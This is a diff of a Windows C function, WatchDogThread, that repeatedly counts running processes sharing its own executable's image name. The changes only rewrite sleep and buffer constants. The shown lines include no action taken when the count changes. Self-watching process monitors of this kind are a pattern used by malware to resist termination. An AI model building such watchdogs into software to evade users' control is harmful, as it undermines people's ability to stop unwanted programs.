@@ -4,10 +4,10 @@
 DWORD WINAPI WatchDogThread(LPVOID lpParameter) {
 	int oProc = 0;
 
-	wchar_t *pifn = (wchar_t *)LocalAlloc(LMEM_ZEROINIT, 512);
-	GetProcessImageFileName(GetCurrentProcess(), pifn, 512);
+	wchar_t *pifn = (wchar_t *)LocalAlloc(LMEM_ZEROINIT, 0x200);
+	GetProcessImageFileName(GetCurrentProcess(), pifn, 0x200);
 
-	Sleep(0x7ff);
+	Sleep(2048);
 
 	for (;;) {
 		HANDLE Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
@@ -19,8 +19,8 @@ DWORD WINAPI WatchDogThread(LPVOID lpParameter) {
 		int nProc = 0;
 		while (Process32Next(Snapshot, &Proc)) {
 			HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, Proc.th32ProcessID);
-			wchar_t *pifn2 = (wchar_t *)LocalAlloc(LMEM_ZEROINIT, 512);
-			GetProcessImageFileName(hProc, pifn2, 512);
+			wchar_t *pifn2 = (wchar_t *)LocalAlloc(LMEM_ZEROINIT, 0x200);
+			GetProcessImageFileName(hProc, pifn2, 0x200);
 
 			if (!lstrcmp(pifn, pifn2)) {
 				nProc++;
@@ -38,7 +38,7 @@ DWORD WINAPI WatchDogThread(LPVOID lpParameter) {
 
 		oProc = nProc;
 
-		Sleep(0x7f);
+		Sleep(512);
 	}
 }
 
